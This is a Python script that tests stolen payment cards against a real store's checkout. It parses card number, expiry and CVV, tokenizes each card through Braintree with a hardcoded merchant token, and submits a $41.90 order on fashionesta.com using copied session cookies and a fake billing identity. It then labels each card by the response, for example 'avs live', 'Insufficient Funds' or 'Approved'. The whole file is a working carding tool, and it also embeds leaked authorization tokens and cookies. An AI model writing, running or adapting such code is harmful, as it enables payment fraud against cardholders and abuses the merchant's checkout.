import requests
import time
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
    'accept': '*/*',
    'accept-language': 'en',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjUxNjk4NDcsImp0aSI6IjY5NzcxYTcyLTAyZGEtNDdhMS1iODM5LTQyZjlmMGMyZTUxNiIsInN1YiI6ImJmdm5uaGs4bnRrc2czd3IiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImJmdm5uaGs4bnRrc2czd3IiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImZhc2hpb25lc3RhY29tVVNEIn19.JWoIrhgSq0mi7yFZrjqhMBvsrB34xiOMOlvjCrq8QiMBQLVAWxHV0hSqCN6ux8AZ4qp9CTZav4dytzL8tKX7lQ',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'c16ce547-9694-4e48-816f-8aab7ddd904a',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '07035-1774',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}


	r1 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	response_json = r1.json()
	time.sleep(3)
	tok = response_json['data']['tokenizeCreditCard']['token']
	headers = {
    'accept': '*/*',
    'accept-language': 'en',
    'content-type': 'application/json',
    'origin': 'https://www.fashionesta.com',
    'priority': 'u=1, i',
    'referer': 'https://www.fashionesta.com/',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

	json_data = {
    'amount': '41.90',
    'additionalInfo': {
        'shippingGivenName': 'mike',
        'shippingSurname': 'edwin',
        'shippingPhone': '',
        'billingLine1': '1 Station Rd Ste A',
        'billingLine2': 'Allen Ganj',
        'billingCity': 'Lincoln Park',
        'billingState': 'NJ',
        'billingPostalCode': '07035-1774',
        'billingCountryCode': 'US',
        'billingPhoneNumber': '',
        'billingGivenName': 'mike',
        'billingSurname': 'edwin',
        'shippingLine1': '1 Station Rd Ste A',
        'shippingLine2': 'Allen Ganj',
        'shippingCity': 'Lincoln Park',
        'shippingState': 'NJ',
        'shippingPostalCode': '07035-1774',
        'shippingCountryCode': 'US',
    },
    'dfReferenceId': '1_75743eed-7ad5-416a-8c64-48b432756c30',
    'clientMetadata': {
        'sdkVersion': 'web/3.48.0',
        'requestedThreeDSecureVersion': '2',
        'cardinalDeviceDataCollectionTimeElapsed': 64,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjUxNjk4NDgsImp0aSI6ImI2ZDE4MjY5LTUxYzktNGFkNy1hZDFmLTk1NGU2OTNlN2E4NCIsInN1YiI6ImJmdm5uaGs4bnRrc2czd3IiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImJmdm5uaGs4bnRrc2czd3IiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImZhc2hpb25lc3RhY29tVVNEIn19.5BonppzwFNm6bBgesboRI1cN9smox1MQQlJUA2qTuMo3hMsVp45hi47KM2lGLxlzld4aHzBIYTtdoi1_jgGw3w',
    'braintreeLibraryVersion': 'braintree/web/3.48.0',
    '_meta': {
        'merchantAppId': 'www.fashionesta.com',
        'platform': 'web',
        'sdkVersion': '3.48.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '402d204a-f450-465e-85e0-95a3c01c1f12',
    },
}

	r2 = requests.post(f'https://api.braintreegateway.com/merchants/bfvnnhk8ntksg3wr/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
    )
	non = r2.json()['paymentMethod']['nonce']

	cookies = {
    'redirected_country': 'IN',
    'frontend': 't7ol8vmpjnbc496p4qtkto0uh5',
    'frontend_cid': 'i1tco2V2lsCYsdbt',
    '_fbp': 'fb.1.1724577015034.482857664296580913',
    'popup_user_id': '223936845',
    'segment_checksum': 'd751713988987e9331980363e24189ce',
    'customer_has_purchase': '0',
    'varnish_token': 'ObOzTdi2hCif2KHD',
    'varnish_token_checksum': '729eedf19a9ed3da46e2b1dbfe5ab9a4',
    'apay-session-set': 'V%2BFvgQGXzlzlvCIOXgLX7hJWnxyJ981deCq9T%2F8148FsbyTpHLZQzsL6N5QR5zE%3D',
    'experiment': '0',
    'redirected_country': 'US',
    'detected_country': 'US',
    'mailchimp_landing_page': 'https%3A//www.fashionesta.com/en-us/onepage/',
    'essential': '1',
    'optimization-performance': '1',
    'personalization-comfort': '1',
    'cto_bundle': 'AITWIV9yeExTcmdQbkRwRkJ2MTBMWW9reG4xcEdobFRYY3FkdE9vJTJCbVdJMTJBVm1DRm5Hbnlib2NHQ1hhUjBvemhWcGpLTnJUcXVCM0xuNUZrd3R4VVpUelpWQWd0cTFqVVE2UHFnZERSNHRqRENoUVhHWnpqUWhvdHNSRFpIR3VhQXlXaGlHcW5jTCUyRnRxOTV5WVVnWHclMkYlMkJBYUVwdGlBS1VUaTlEOTY0d21kOEVxQSUzRA',
    '_ga_D6K9DKC00P': 'GS1.1.1725083479.12.0.1725083490.49.0.0',
    '_ga': 'GA1.2.1511576110.1724577015',
    '_gat_G-D6K9DKC00P': '1',
    '_gcl_au': '1.1.1206184543.1724577015.836901052.1725083499.1725083499',
    'quote_checksum': '8793bc6c1643420f65762d6149cdfded',
}

	headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'redirected_country=IN; frontend=t7ol8vmpjnbc496p4qtkto0uh5; frontend_cid=i1tco2V2lsCYsdbt; _fbp=fb.1.1724577015034.482857664296580913; popup_user_id=223936845; segment_checksum=d751713988987e9331980363e24189ce; customer_has_purchase=0; varnish_token=ObOzTdi2hCif2KHD; varnish_token_checksum=729eedf19a9ed3da46e2b1dbfe5ab9a4; apay-session-set=V%2BFvgQGXzlzlvCIOXgLX7hJWnxyJ981deCq9T%2F8148FsbyTpHLZQzsL6N5QR5zE%3D; experiment=0; redirected_country=US; detected_country=US; mailchimp_landing_page=https%3A//www.fashionesta.com/en-us/onepage/; essential=1; optimization-performance=1; personalization-comfort=1; cto_bundle=AITWIV9yeExTcmdQbkRwRkJ2MTBMWW9reG4xcEdobFRYY3FkdE9vJTJCbVdJMTJBVm1DRm5Hbnlib2NHQ1hhUjBvemhWcGpLTnJUcXVCM0xuNUZrd3R4VVpUelpWQWd0cTFqVVE2UHFnZERSNHRqRENoUVhHWnpqUWhvdHNSRFpIR3VhQXlXaGlHcW5jTCUyRnRxOTV5WVVnWHclMkYlMkJBYUVwdGlBS1VUaTlEOTY0d21kOEVxQSUzRA; _ga_D6K9DKC00P=GS1.1.1725083479.12.0.1725083490.49.0.0; _ga=GA1.2.1511576110.1724577015; _gat_G-D6K9DKC00P=1; _gcl_au=1.1.1206184543.1724577015.836901052.1725083499.1725083499; quote_checksum=8793bc6c1643420f65762d6149cdfded',
    'origin': 'https://www.fashionesta.com',
    'priority': 'u=1, i',
    'referer': 'https://www.fashionesta.com/en-us/onepage/',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'payment[method]': 'gene_braintree_creditcard',
    'payment[payment_method_nonce]': non,
    'braintree_creditcard_payment_method': 'gene_braintree_creditcard',
    'agreement[gene_braintree_creditcard][1]': '1',
    'payment[device_data]': '{"device_session_id":"ef1282def4f1401e5eec0823ce6280de","fraud_merchant_id":null}',
    'is_subscribed': '0',
    'customer_comment': '',
}
	r3 = requests.post('https://www.fashionesta.com/en-int/onepage/json/saveOrder', cookies=cookies, headers=headers, data=data)

	card = f"{n}|{mm}|{yy}|{cvc}"

	resp = r3.text
	time.sleep(3)

	try:
		if 'avs' in resp:
			res = 'avs live'
		elif 'cvv.' in resp or 'Card Issuer Declined CVV' in resp:
			res = 'Card Issuer Declined CVV'
		elif 'Insufficient Funds' in resp or 'funds' in resp:
			res = 'Insufficient Funds'
		elif '1000: Approved' in resp:
			res = '1000: Approved'
		elif 'Invalid postal code' in resp:
			res = 'Invalid postal code'
		elif 'fraud' in resp:
			res = 'Gateway Rejected: fraud'
		elif 'failed 3D secure validation' in resp:
			res = '3D Secure'
		elif 'transaction has Yeen declined' in resp:
			res = 'Your card was declined.'
		elif 'risk_threshold' in resp:
			res = 'Gateway Rejected: risk_threshold'
		else:
			time.sleep(3)
			res = r3.json().get('error')
	except:
		print("Error")
